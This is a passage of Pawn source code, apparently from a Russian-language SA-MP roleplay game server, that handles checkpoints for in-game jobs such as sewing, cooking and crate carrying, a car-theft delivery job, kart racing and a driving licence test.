		SendClientMessage(playerid,CGREEN,"Возьмите заготовки на складе.");
	}
	if(GetPVarInt(playerid,"Shve") > 0)
	{
	    switch(GetPVarInt(playerid,"ShveW"))
	    {
	        case 1:
	        {
	            DisablePlayerCheckpoint(playerid);
	            SetPlayerSpecialAction(playerid,25);
	            switch(random(2))
				{
					case 0: SetPlayerAttachedObject(playerid, 5, 2384, 5, 0.000000, 0.140000, 0.194999, -85.100013, 0.000000, 100.700019, 1.000000, 1.00, 1.000000);
					case 1: SetPlayerAttachedObject(playerid, 5, 2386, 5, 0.000000, 0.140000, 0.194999, -85.100013, 0.000000, 100.700019, 1.000000, 1.00, 1.000000);
				}
				SendClientMessage(playerid,CGREEN,"Следуйте к станку для шитья");
				SetPVarInt(playerid,"ShveW",2);
				
				new rand = random(sizeof(randomstol));
				SetPVarInt(playerid,"ShveR",rand);
				SetTimerEx("TimerCheckPoint",1000,false,"dffff",playerid, randomstol[rand][0],randomstol[rand][1],randomstol[rand][2], 1.0);
				

	        }
	        case 2:
	        {
	            slot = GetPVarInt(playerid,"ShveR");
	            SetPlayerFacingAngle(playerid,randomstol[slot][3]);
	            SetPlayerSpecialAction(playerid,0);
	            if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);
	            DisablePlayerCheckpoint(playerid);
			    SetPVarInt(playerid,"Vzlom",11);
				ApplyAnimation(playerid, "OTB", "BETSLP_LOOP",4.0,1,0,0,0,0,1);
				StartGame(playerid);

	        }
	        case 3:
	        {
	            slot = GetPVarInt(playerid,"ShveR");
	            SetPlayerFacingAngle(playerid,upokovka[slot][3]);
         		static const Float:objup[][6] = {
				{ 2866.35181, -1202.11536, 1027.77112,   0.00000, 0.00000, 0.00000},
				{ 2863.86084, -1202.09900, 1027.77112,   0.00000, 0.00000, 0.00000},
				{ 2861.36084, -1202.12427, 1027.77112,   0.00000, 0.00000, 0.00000},
				{ 2858.85840, -1202.11011, 1027.77112,   0.00000, 0.00000, 0.00000},
				{ 2861.36572, -1204.22595, 1027.77112,   0.00000, 0.00000, 0.00000},
				{ 2863.85229, -1204.22681, 1027.77112,   0.00000, 0.00000, 0.00000},
				{ 2866.36841, -1204.22107, 1027.77112,   0.00000, 0.00000, 0.00000},
				{ 2858.52100, -1209.13831, 1027.95105,   0.00000, 0.00000, 90.00000},
				{ 2858.54370, -1211.64807, 1027.95105,   0.00000, 0.00000, 90.00000}
				};
	            
	            obj = CreateDynamicObject(2694, objup[slot][0], objup[slot][1], objup[slot][2],   objup[slot][3], objup[slot][4], objup[slot][5]);
	            DeletePVar(playerid,"ShveR");
	            DisablePlayerCheckpoint(playerid);
			    if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);
			    SetPVarInt(playerid,"ShveObject",obj);
			    GameTextForPlayer(playerid, "~G~WAIT 5 SECONDS....", 5000, 1);
			    TogglePlayerControllable(playerid, 0);
			    ApplyAnimation(playerid, "OTB", "BETSLP_LOOP",4.0,1,0,0,0,0,1);
			    SetPVarInt(playerid,"AntiSbiv",1);
				SetTimerEx("SheTime",5000,false,"i",playerid);

	        }
         	case 4:
	        {
	            SetPlayerSpecialAction(playerid,0);
	            if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);
	            DisablePlayerCheckpoint(playerid);
			    SetPVarInt(playerid,"ShveW",1);
			    SetPVarInt(playerid,"ShveC",GetPVarInt(playerid,"ShveC")+1);
			    static const fmt_string2[] = "Вы успешно сшили и упаковали одежду. Ваш общий заработок: $%d";
				new str2[sizeof(fmt_string2)+5];
				format(str2, sizeof(str2), fmt_string2,GetPVarInt(playerid,"ShveC")*1);
				SendClientMessage(playerid,CREWARD,str2);
			    SetPlayerCheckpoint(playerid, 2856.0452,-1211.2482,1028.0563, 3.0);
				
	        }
	    }
	}
	if(GetPVarInt(playerid,"Pes") > 0)
	{
	    switch(GetPVarInt(playerid,"PesW"))
	    {
     		case 2:
	        {
                SetPVarInt(playerid,"PesW",1);
                if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
                ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
                if(PlayerInfo[playerid][pQuest] == 1) PlayerInfo[playerid][pQ][2]++;
				obj = CreateDynamicObject(2060, -1309.47070, 2690.38232, 49.54350,   0.00000, -28.00000, 30.00000,-1,-1,-1,300.0,300.0);
				MoveDynamicObject(obj,-1282.88025, 2705.12695, 67.22720,2);
				Streamer_AppendArrayData(STREAMER_TYPE_OBJECT, obj, E_STREAMER_EXTRA_ID, -2);
				Streamer_AppendArrayData(STREAMER_TYPE_OBJECT, obj, E_STREAMER_EXTRA_ID, playerid);
				Streamer_AppendArrayData(STREAMER_TYPE_OBJECT, obj, E_STREAMER_EXTRA_ID, 1);
				SetPVarInt(playerid,"PesC",GetPVarInt(playerid,"PesC")+1);
				static const fmt_string2[] = "Вы успешно принесли мешок на конвеер. Ваш общий заработок: $%d";
				new str2[sizeof(fmt_string2)+5];
				format(str2, sizeof(str2), fmt_string2,GetPVarInt(playerid,"PesC")*2);
				SendClientMessage(playerid,CREWARD,str2);
				SetPlayerSpecialAction(playerid,0);
                SetPlayerAttachedObject(playerid, 1, 337, 6, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.00, 1.000000);
                new check,picka;
	            switch(random(8))
				{

				    case 0: check = CreateDynamicCP(-1326.5011,2720.1338,52.4785, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1326.5011,2720.1338,52.4785, 0, 0, playerid, 100.0);
					case 1: check = CreateDynamicCP(-1327.5321,2726.7690,57.4201, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1327.5321,2726.7690,57.4201, 0, 0, playerid, 100.0);
					case 2: check = CreateDynamicCP(-1339.5184,2716.8699,57.5608, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1339.5184,2716.8699,57.5608, 0, 0, playerid, 100.0);
					case 3: check = CreateDynamicCP(-1331.4587,2705.1772,54.6513, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1331.4587,2705.1772,54.6513, 0, 0, playerid, 100.0);
					case 4: check = CreateDynamicCP(-1346.6035,2731.0549,56.3454, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1346.6035,2731.0549,56.3454, 0, 0, playerid, 100.0);
					case 5: check = CreateDynamicCP(-1341.8770,2754.1526,60.3163, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1341.8770,2754.1526,60.3163, 0, 0, playerid, 100.0);
					case 6: check = CreateDynamicCP(-1331.9568,2748.6819,59.9250, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1331.9568,2748.6819,59.9250, 0, 0, playerid, 100.0);
					case 7: check = CreateDynamicCP(-1359.0675,2726.4775,57.1666, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1359.0675,2726.4775,57.1666, 0, 0, playerid, 100.0);
				}
				SetPVarInt(playerid,"PesCheck",check);
				SetPVarInt(playerid,"PesPick",picka);
	        }
	    }
	    
	}
	if(GetPVarInt(playerid,"Povar") > 0)
	{
	    switch(GetPVarInt(playerid,"PovarW"))
	    {
	        case 1:
	        {
    	    	switch(GetPVarInt(playerid,"PovarEda"))
			    {
			        case 1:
					{
						SetPlayerAttachedObject(playerid, 1, 19582, 5, 0.084999, 0.025999, 0.000000, 104.800003, 29.699987, 0.000000, 1.000000, 1.00, 1.000000); //(Мясо)
						
					}
			        case 2:
					{
						SetPlayerAttachedObject(playerid, 1, 19579, 5, 0.159999, 0.075999, 0.003000, 0.000000, -100.499954, 0.000000, 1.000000, 1.00, 1.000000); //(Хлеб)
					
					}
			        case 3:
					{
						SetPlayerAttachedObject(playerid, 1, 19630, 5, 0.045000, 0.013000, 0.018000, 0.000000, -90.800010, 2.600047, 1.000000, 1.00, 1.000000); //(Рыба)
						
					}
			    }
			    new rand = random(6);
			    SetPlayerCheckpoint(playerid, Step2[rand][0], Step2[rand][1], Step2[rand][2], 1.0);
			    SetPVarInt(playerid,"PovarW",2);
			    SetPVarInt(playerid,"CheckPov",rand);
			    SendClientMessage(playerid,CGREEN,"Следуйте к разделочной доске, чтобы разделать ингредиенты");
	        }
  			case 2:
			{
			    new i = GetPVarInt(playerid,"CheckPov");
			    SetPlayerPos(playerid,Step2[i][0], Step2[i][1], Step2[i][2]);
			    SetPlayerFacingAngle(playerid,Step2[i][3]);
                switch(GetPVarInt(playerid,"PovarEda"))
                {
                    case 1: obj = CreateDynamicObject(19582, Step2Obj[i][0], Step2Obj[i][1], Step2Obj[i][2],   0.00000, 0.00000, 0.00000,5,5,-1,300.0,300.0); //(Мясо)
                    case 2: obj = CreateDynamicObject(19579, Step2Obj[i][0], Step2Obj[i][1], Step2Obj[i][2],   0.00000, 0.00000, 0.00000,5,5,-1,300.0,300.0);
                    case 3: obj = CreateDynamicObject(19630, Step2Obj[i][0], Step2Obj[i][1], Step2Obj[i][2],  -90.00000, -90.00000, 0.00000,5,5,-1,300.0,300.0);
                }
			   /* switch(GetPVarInt(playerid,"PovarEda"))
			    {
			        case 1:
					{
					    SetPlayerPos(playerid,-790.0610,505.9941,1367.3672);
					    SetPlayerFacingAngle(playerid,267.5315);
						obj = CreateDynamicObject(19582, -789.32953, 505.96201, 1367.51111,   0.00000, 0.00000, 0.00000,GetPlayerVirtualWorld(playerid),-1,-1,300.0,300.0); //(Мясо)
					}
			        case 2:
					{
	    				SetPlayerPos(playerid,-790.0616,504.6581,1367.3672);
					    SetPlayerFacingAngle(playerid,266.3173);
						obj = CreateDynamicObject(19579, -789.34528, 504.64050, 1367.46680,   0.00000, 0.00000, 90.00000,GetPlayerVirtualWorld(playerid),-1,-1,300.0,300.0); //(Хлеб)
					}
			        case 3:
					{
 						SetPlayerPos(playerid,-791.9619,501.9932,1367.3672);
					    SetPlayerFacingAngle(playerid,89.0107);
						obj = CreateDynamicObject(19630, -792.70929, 502.00793, 1367.48608,   270.00000, 0.00000, 90.00000,GetPlayerVirtualWorld(playerid),-1,-1,300.0,300.0); //(Рыба)
					}
			    }*/
			    DisablePlayerCheckpoint(playerid);
			    SetPVarInt(playerid,"PovarObject",obj);
			    SetPVarInt(playerid,"Vzlom",6);
				SetPlayerAttachedObject(playerid, 1, 19583, 6, 0.061999, 0.036000, 0.000000, 112.700004, 0.000000, 0.000000, 1.000000, 1.00, 1.000000);
				ApplyAnimation(playerid, "OTB", "BETSLP_LOOP",4.0,1,0,0,0,0,1);
                StartGame(playerid);

			}
			case 3:
			{
			    SetPlayerAttachedObject(playerid, 1, 19561, 5, 0.091000, 0.018000, -0.028999, 0.000000, -106.599983, 16.899999, 0.848999, 0.70, 0.446000);
				SendClientMessage(playerid,CGREEN,"Отправляйтесь доделывать блюдо.");
				SetPVarInt(playerid,"PovarW",4);
				new rand = random(6);
			    SetPlayerCheckpoint(playerid, Step4[rand][0], Step4[rand][1], Step4[rand][2], 1.0);
			    SetPVarInt(playerid,"CheckPov",rand);
   				/*switch(GetPVarInt(playerid,"PovarEda"))
			    {
			        case 1: SetPlayerCheckpoint(playerid,-787.7172,508.6421,1367.3672, 1.0);
			        case 2: SetPlayerCheckpoint(playerid,-786.4808,508.6421,1367.3672, 1.0);
			        case 3: SetPlayerCheckpoint(playerid,-786.2879,504.7390,1367.3672, 1.0);
			    }*/
			}
			case 4:
			{
			    new i = GetPVarInt(playerid,"CheckPov");
			    SetPlayerPos(playerid,Step4[i][0], Step4[i][1], Step4[i][2]);
			    SetPlayerFacingAngle(playerid,Step4[i][3]);
			    switch(GetPVarInt(playerid,"PovarEda"))
			    {
			        case 1: obj = CreateDynamicObject(19580,  Step4Obj[i][0], Step4Obj[i][1], Step4Obj[i][2],   0.00000, 0.00000, 0.00000,5,5,-1,300.0,300.0); //(Мясо)
			        case 2: obj = CreateDynamicObject(2768,  Step4Obj[i][0], Step4Obj[i][1], Step4Obj[i][2],   0.00000, 0.00000, 0.00000,5,5,-1,300.0,300.0);
			        case 3: obj = CreateDynamicObject(2769,  Step4Obj[i][0], Step4Obj[i][1], Step4Obj[i][2],   0.00000, 0.00000, 0.00000,5,5,-1,300.0,300.0);
			    }
			    /*switch(GetPVarInt(playerid,"PovarEda"))
			    {
			        case 1:
					{
						SetPlayerPos(playerid,-787.7172,508.6421,1367.3672);
					    SetPlayerFacingAngle(playerid,359.4043);
						obj = CreateDynamicObject(19580, -787.71210, 509.27829, 1367.46619,   0.00000, 0.00000, 0.00000,GetPlayerVirtualWorld(playerid),-1,-1,300.0,300.0); //(Мясо)
					}
			        case 2:
					{
						SetPlayerPos(playerid,-786.4808,508.6421,1367.3672);
					    SetPlayerFacingAngle(playerid,2.0755);
						obj = CreateDynamicObject(2768, -786.48822, 509.13251, 1367.56592,   0.00000, 0.00000, 0.00000,GetPlayerVirtualWorld(playerid),-1,-1,300.0,300.0); //(Хлеб)
					}
			        case 3:
					{
						SetPlayerPos(playerid,-786.2879,504.7390,1367.3672);
					    SetPlayerFacingAngle(playerid,269.3123);
						obj = CreateDynamicObject(2769, -785.67761, 504.70959, 1367.48584,   0.00000, 0.00000, 0.00000,GetPlayerVirtualWorld(playerid),-1,-1,300.0,300.0); //(Рыба)
					}
			    }*/
			    DisablePlayerCheckpoint(playerid);
			    if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			    SetPVarInt(playerid,"PovarObject",obj);
			    GameTextForPlayer(playerid, "~G~WAIT 5 SECONDS....", 5000, 1);
			    TogglePlayerControllable(playerid, 0);
			    ApplyAnimation(playerid, "OTB", "BETSLP_LOOP",4.0,1,0,0,0,0,1);
			    SetPVarInt(playerid,"AntiSbiv",1);
				SetTimerEx("PovarTime",5000,false,"i",playerid);
			}
			case 5:
			{
   				switch(GetPVarInt(playerid,"PovarEda"))
			    {
			        case 1:
					{
					    obj = CreateDynamicObject(19571, 1393.36, -34.24, 1000.45, 90.0, 0.00, 0.00,5,5,-1,300.0,300.0);
					    MoveDynamicObject(obj,1385.13, -34.24, 1000.45,1);
						SetPVarInt(playerid,"PovarM",GetPVarInt(playerid,"PovarM")+3);
					}
			        case 2:
					{
					    obj = CreateDynamicObject(2663, 1393.29, -34.38, 1000.66, 0.00, 0.00, 0.00,5,5,-1,300.0,300.0);
					    MoveDynamicObject(obj,1385.13, -34.38, 1000.66,1);
						SetPVarInt(playerid,"PovarM",GetPVarInt(playerid,"PovarM")+2);
					}
			        case 3:
					{
					    obj = CreateDynamicObject(2663, 1393.29, -34.38, 1000.66, 0.00, 0.00, 0.00,5,5,-1,300.0,300.0);
					    MoveDynamicObject(obj,1385.13, -34.38, 1000.66,1);
						SetPVarInt(playerid,"PovarM",GetPVarInt(playerid,"PovarM")+4);
					}
			    }
			    
			    Streamer_AppendArrayData(STREAMER_TYPE_OBJECT, obj, E_STREAMER_EXTRA_ID, -2);
				Streamer_AppendArrayData(STREAMER_TYPE_OBJECT, obj, E_STREAMER_EXTRA_ID, playerid);
				Streamer_AppendArrayData(STREAMER_TYPE_OBJECT, obj, E_STREAMER_EXTRA_ID, 1);
			    SetPlayerSpecialAction(playerid,0);
				SetPVarInt(playerid,"PovarC",GetPVarInt(playerid,"PovarC")+1);
				SetPVarInt(playerid,"PovarW",1);
				DisablePlayerCheckpoint(playerid);
				static const fmt_string2[] = "Вы успешно приготовили блюдо. Ваш общий заработок: $%d";
				new str2[sizeof(fmt_string2)+5];
				format(str2, sizeof(str2), fmt_string2,GetPVarInt(playerid,"PovarM"));
				SendClientMessage(playerid,CREWARD,str2);
			    SetPlayerZakaz(playerid);
			    if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			}
	    }
	}
	if(GetPVarInt(playerid,"GruzW") == 1 && GetPVarInt(playerid,"Gruz") > 0)
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT) return 1;
	    SetPVarInt(playerid,"GruzW",2);
	    SetPVarInt(playerid,"AntiFloodGruz",gettime() + 15);
	    SetPlayerAttachedObject(playerid, 1, 2912, 1, 0.152999, 0.436999, -0.273000, 0.000000, 0.000000, 0.000000, 0.722001, 0.65, 0.739000);
	    SetPlayerSpecialAction(playerid,25);
	    SetPlayerCheckpoint(playerid, 1606.4205,736.7731,10.6680, 3.0);
	}
	else if(GetPVarInt(playerid,"GruzW") == 2 && GetPVarInt(playerid,"Gruz") > 0)
	{
	    if(GetPVarInt(playerid,"AntiFloodGruz") > gettime()) return SendClientMessage(playerid,CGREY,"Подождите...");
	    ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
	    SetPVarInt(playerid,"GruzW",1);
		SetPlayerSpecialAction(playerid,0);
		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
		SetPlayerCheckpoint(playerid, 1738.3090,761.8082,10.6680, 3.0);
		SetPVarInt(playerid,"GruzC",GetPVarInt(playerid,"GruzC")+1);
		static const fmt_string2[] = "Вы успешно перенесли ящик. Ваш общий заработок: $%d";
		new str2[sizeof(fmt_string2)+5];
		format(str2, sizeof(str2), fmt_string2,GetPVarInt(playerid,"GruzC")*2);
		SendClientMessage(playerid,CREWARD,str2);
		if(PlayerInfo[playerid][pQuest] == 1) PlayerInfo[playerid][pQ][0]++;
		Prod += 5;
		SetMatsInt("prod",Prod);
		UpdProd();
	}
	return 1;
}

public OnPlayerLeaveCheckpoint(playerid)
{

	return 1;
}
stock GetCar(playerid)
{
	switch(GetPVarInt(playerid,"Krug"))
	{
	    case 0:
	    {
	        switch(GetPVarInt(playerid,"Check"))
			{
			    case 3: return 415;
			    case 6: return 468;
			    case 9: return 541;
			    case 12: return 562;
			    case 15: return 571;
			    case 18: return 560;
			    case 21: return 549;
			}
	    }
	    case 1:
	    {
	        switch(GetPVarInt(playerid,"Check"))
			{
			    case 3: return 535;
			    case 6: return 531;
			    case 9: return 506;
			    case 12: return 495;
			    case 15: return 475;
			    case 18: return 471;
			    case 21: return 462;
			}
	    }
	}
	return true;
}
public OnPlayerEnterRaceCheckpoint(playerid)
{
    if(GetPVarInt(playerid,"CarRobW") == 2 )
	{
	    if(IsPlayerInRangeOfPoint(playerid, 10.0, 2410.3970,-1425.6722,23.6744))
		{
		    new veh = GetPlayerVehicleID(playerid);
		    if(veh == CarRob[GetPVarInt(playerid,"CarRob")-1])
		    {
		        DisablePlayerRaceCheckpoint(playerid);
		        new Float:hl;
		        GetVehicleHealth(veh,hl);
		        new cena;
		        if(hl > 900)
		        {
		            switch(PlayerInfo[playerid][pCRL])
		            {
		                case 0: cena = 20;
		                case 1: cena = 30;
		                case 2: cena = 40;
		            }
		        }
		        if(hl < 900 && hl > 600)
		        {
		            switch(PlayerInfo[playerid][pCRL])
		            {
		                case 0: cena = 15;
		                case 1: cena = 25;
		                case 2: cena = 35;
		            }
		        }
		        if(hl < 600)
		        {
		            switch(PlayerInfo[playerid][pCRL])
		            {
		                case 0: cena = 10;
		                case 1: cena = 20;
		                case 2: cena = 30;
		            }
		        }
		        PlayerInfo[playerid][pCRC]++;
		        static const fmt_string2[] = "Вы успешно доставили транспорт. Ваш заработок: $%d";
				new str2[sizeof(fmt_string2)+5];
				format(str2, sizeof(str2), fmt_string2,cena);
				SendClientMessage(playerid,CREWARD,str2);
				GiveMoney(playerid,cena);
				PlayerInfo[playerid][pCrimeStats][C_CR]++;
				if(gettime()-GetPVarInt(playerid,"RobCarTime") < PlayerInfo[playerid][pCrimeStats][C_CRT]) PlayerInfo[playerid][pCrimeStats][C_CRT] = gettime()-GetPVarInt(playerid,"RobCarTime");
				if(PlayerInfo[playerid][pCRC] > 15 && !PlayerInfo[playerid][pCRL])
				{
				    PlayerInfo[playerid][pCRC] = 0;
				    PlayerInfo[playerid][pCRL]++;
				    SendClientMessage(playerid,CREWARD,"Поздравляю! Теперь Вам доступен новый класс транспорта!");
				}
				if(PlayerInfo[playerid][pCRC] > 10 && PlayerInfo[playerid][pCRL] == 1)
				{
				    PlayerInfo[playerid][pCRC] = 0;
				    PlayerInfo[playerid][pCRL]++;
				    SendClientMessage(playerid,CREWARD,"Поздравляю! Теперь Вам доступен новый класс транспорта!");
				}
				if(PlayerInfo[playerid][pCRC] > 5 && PlayerInfo[playerid][pCRL] == 2)
				{
				    PlayerInfo[playerid][pCRC] = 0;
				    PlayerInfo[playerid][pCRL]++;
				    SendClientMessage(playerid,CREWARD,"Поздравляю! Вы выполнили все заказы!");
				    if(!PlayerInfo[playerid][pQuestS][12])
					{
						PlayerQuest[playerid][12][0]++;
						CheckQuest(playerid,12);
					}
				}
		        RemovePlayerFromVehicle(playerid);
		        SetVehicleVirtualWorld(veh,18);
				DeletePVar(playerid,"CarRobW");
				DeletePVar(playerid,"CarRob");
		        DeletePVar(playerid,"RobCarTime");
		    }
		}
	}
    if(GetPVarInt(playerid,"InDrift"))
	{
	    DisablePlayerRaceCheckpoint(playerid);
	    SetPVarInt(playerid,"RaceCheckpoint",GetPVarInt(playerid,"RaceCheckpoint")+1);
	    if(GetPVarInt(playerid,"RaceCheckpoint") < 31)
	    {
	        SetPlayerRaceCheckpoint(playerid, 0,racech[GetPVarInt(playerid,"RaceCheckpoint")][0], racech[GetPVarInt(playerid,"RaceCheckpoint")][1], racech[GetPVarInt(playerid,"RaceCheckpoint")][2], racech[GetPVarInt(playerid,"RaceCheckpoint")+1][0], racech[GetPVarInt(playerid,"RaceCheckpoint")+1][1], racech[GetPVarInt(playerid,"RaceCheckpoint")+1][2], 5);
    	}
    	else if(GetPVarInt(playerid,"RaceCheckpoint") == 31)
    	{
            SetPlayerRaceCheckpoint(playerid, 1,racech[GetPVarInt(playerid,"RaceCheckpoint")][0], racech[GetPVarInt(playerid,"RaceCheckpoint")][1], racech[GetPVarInt(playerid,"RaceCheckpoint")][2], 0.0, 0.0, 0.0, 5);
		}
		else if(GetPVarInt(playerid,"RaceCheckpoint") == 32)
        {
			if(driftveh[GetPVarInt(playerid,"DriftVeh")] != INVALID_VEHICLE_ID)
		    {
			    DestroyVehicle(driftveh[GetPVarInt(playerid,"DriftVeh")]);
			    driftveh[GetPVarInt(playerid,"DriftVeh")] = INVALID_VEHICLE_ID;
		    }
            SetPlayerPos(playerid,1633.4722,971.8034,10.8203);
		    SetPlayerFacingAngle(playerid,265.9857);
		    SetPlayerInterior(playerid,0);
		    SetPlayerVirtualWorld(playerid,0);
		    DeletePVar(playerid,"DriftO");
		    DisablePlayerRaceCheckpoint(playerid);
		    DeletePVar(playerid,"InDrift");
		    DeletePVar(playerid,"DriftVeh");
			if(winner == INVALID_PLAYER_ID)
			{
			    winner = playerid;
			    static const fmt_string2[] = "[Новости] {FFFFFF} Победителем в 'Kart Racing' стал %s. Поздравляем!";
				new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME-2];
				format(str2, sizeof(str2), fmt_string2,PlayerInfo[playerid][pSendername]);
				SendClientMessageToAll(CREWARD,str2);
				GiveMoney(playerid,KolvoIg*25);
			}
			KolvoIg--;
			if(KolvoIg < 1) InGame = 0;
    	}
    	return 1;
	}
/*	if(GetPVarInt(playerid,"CarLvl") == 1 && GetVehicleModel(GetPlayerVehicleID(playerid)) == 443)
	{
	    DisablePlayerRaceCheckpoint(playerid);
		new Float:x[3];
		GetPlayerPos(playerid,x[0],x[1],x[2]);
	    new objectid = CreateObject(2935,x[0],x[1],x[2],0.0,0.0,0.0);
		AttachObjectToVehicle(objectid, GetPlayerVehicleID(playerid), 0.0, -1.0, 2.4, 15.0, 0.0, 0.0);
		SetPVarInt(playerid,"CarObj",objectid);
	    SetPVarInt(playerid,"CarLvl",2);
	    SendClientMessage(playerid,-1,"Отвезите груз в бизнес");
	    SetPVarInt(playerid,"AntiFlood2",gettime() + 10);
	    SetPlayerRaceCheckpoint(playerid,2,BizInfo[GetPVarInt(playerid,"CarDost")][bX],BizInfo[GetPVarInt(playerid,"CarDost")][bY],BizInfo[GetPVarInt(playerid,"CarDost")][bZ],0,0,0,10);
	}*/
	if(GetPVarInt(playerid,"LicTest") > 0)
	{
	    if(GetPlayerVehicleID(playerid) != GetPVarInt(playerid,"LicCar")) return true;
	    if(GetPVarInt(playerid,"Check") < 89)
	    {
	        SetPVarInt(playerid,"Check",GetPVarInt(playerid,"Check")+1);
			SetPlayerRaceCheckpoint(playerid, 0, LicTest[GetPVarInt(playerid,"Check")][0], LicTest[GetPVarInt(playerid,"Check")][1], LicTest[GetPVarInt(playerid,"Check")][2], LicTest[GetPVarInt(playerid,"Check")+1][0], LicTest[GetPVarInt(playerid,"Check")+1][1], LicTest[GetPVarInt(playerid,"Check")+1][2], 5);
	    }
	    else if(GetPVarInt(playerid,"Check") == 89)
	    {
	        SetPVarInt(playerid,"Check",GetPVarInt(playerid,"Check")+1);
			SetPlayerRaceCheckpoint(playerid, 1, LicTest[GetPVarInt(playerid,"Check")][0], LicTest[GetPVarInt(playerid,"Check")][1], LicTest[GetPVarInt(playerid,"Check")][2], 0.0, 0.0, 0.0, 5);
	    }
	    else if(GetPVarInt(playerid,"Check") == 90)
	    {
	        DisablePlayerRaceCheckpoint(playerid);
	        new Float:health;
	        GetVehicleHealth(GetPlayerVehicleID(playerid),health);
	        if(health <= 500)
	        {
	            DeletePVar(playerid,"LicTest");
	            DeletePVar(playerid,"LicTest1");
	            DeletePVar(playerid,"Check");
	            DeletePVar(playerid,"LicCar");
	            SetVehicleToRespawn(GetPlayerVehicleID(playerid));
	            SendClientMessage(playerid,CREWARD,"Вы не прошли тест на получение прав");
	            return true;
	        }
         	DeletePVar(playerid,"LicTest");
			DeletePVar(playerid,"LicTest1");
			DeletePVar(playerid,"Check");
			DeletePVar(playerid,"LicCar");
			SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			SendClientMessage(playerid,CREWARD,"Поздравляю! Вы прошли тест на водительские права");
			PlayerInfo[playerid][pLic][GetPVarInt(playerid,"LicTest")] = 1;
			PlayerInfo[playerid][pLicTime][GetPVarInt(playerid,"LicTest")] = gettime()+60*60*24*90;
			GiveInv(playerid,449,1);
			if(!PlayerInfo[playerid][pQuestS][3])
			{
				PlayerQuest[playerid][3][0]++;
				CheckQuest(playerid,3);
			}
			if(PlayerInfo[playerid][pHelp] == 3 && PlayerInfo[playerid][pLic][0])
		    {
		        SendClientMessage(playerid,CREWARD,"[Помощник]{ffffff} Молодец! Теперь ты можешь устроится на более прибыльную работу или вступить в организацию.");
				SendClientMessage(playerid,CREWARD,"[Помощник]{ffffff} Посоветую тебе купить телефон для связи в ближайшем 24/7.");
				PlayerInfo[playerid][pHelp] = 0;
		    }
	    }
	}
	if(GetPVarInt(playerid,"GPS") > 0) DisablePlayerRaceCheckpoint(playerid),DeletePVar(playerid,"GPS");
	if(GetPVarInt(playerid,"RazK") > 0)
	{
	    if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 414 ||GetVehicleModel(GetPlayerVehicleID(playerid)) == 456 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 459)
		{
		    if(!IsPlayerInRangeOfPoint(playerid,15,BizInfo[GetPVarInt(playerid,"RazK")][bX],BizInfo[GetPVarInt(playerid,"RazK")][bY],BizInfo[GetPVarInt(playerid,"RazK")][bZ])) return true;
		    DisablePlayerRaceCheckpoint(playerid);
			if(BizInfo[GetPVarInt(playerid,"RazK")][bZakaz] >= Product[GetPlayerVehicleID(playerid)])
			{
				BizInfo[GetPVarInt(playerid,"RazK")][bZakaz] -= Product[GetPlayerVehicleID(playerid)];
				BizInfo[GetPVarInt(playerid,"RazK")][bProd] += Product[GetPlayerVehicleID(playerid)];
			}
			else
			{
			    BizInfo[GetPVarInt(playerid,"RazK")][bProd] += BizInfo[GetPVarInt(playerid,"RazK")][bZakaz];
				Product[GetPlayerVehicleID(playerid)] -= BizInfo[GetPVarInt(playerid,"RazK")][bZakaz];
			 	BizInfo[GetPVarInt(playerid,"RazK")][bZakaz] = 0;
			}
			BizInfo[GetPVarInt(playerid,"RazK")][bMoney] -= 2*Product[GetPlayerVehicleID(playerid)];
			SetBizInt(GetPVarInt(playerid,"RazK"),"money",BizInfo[GetPVarInt(playerid,"RazK")][bMoney]);
			if(!PlayerInfo[playerid][pQuestS][4])
			{
				PlayerQuest[playerid][4][2] ++;
				CheckQuest(playerid,4);
			}
			SendClientMessage(playerid,CREWARD,"Вы выполнили заказ. Заработок: $300");
			Product[GetPlayerVehicleID(playerid)] = 0;
			GiveMoney(playerid,300);
			DeletePVar(playerid,"RazK");
			DisablePlayerRaceCheckpoint(playerid);
		}
	}
	if(GetPVarInt(playerid,"Mar") > 0 && GetPVarInt(playerid,"Mar") < 6)
	{
	    if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 437 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 431)
	    {
			switch(GetPVarInt(playerid,"Mar"))
			{
			    case 1:
			    {
			        PlayerInfo[playerid][pPayDay] += 5;
				    if(floatround(Gorodskoy1[GetPVarInt(playerid,"Check")][3]) == 0)
				    {
				        SetPVarInt(playerid,"Check",GetPVarInt(playerid,"Check")+1);
				        if(GetPVarInt(playerid,"Check") == 72) {
							SetPVarInt(playerid,"Check",0);
							if(!PlayerInfo[playerid][pQuestS][4])
							{
								PlayerQuest[playerid][4][0] ++;
								CheckQuest(playerid,4);
							}
							if(PlayerInfo[playerid][pQuest] == 2) PlayerInfo[playerid][pQ][0]++;
						}
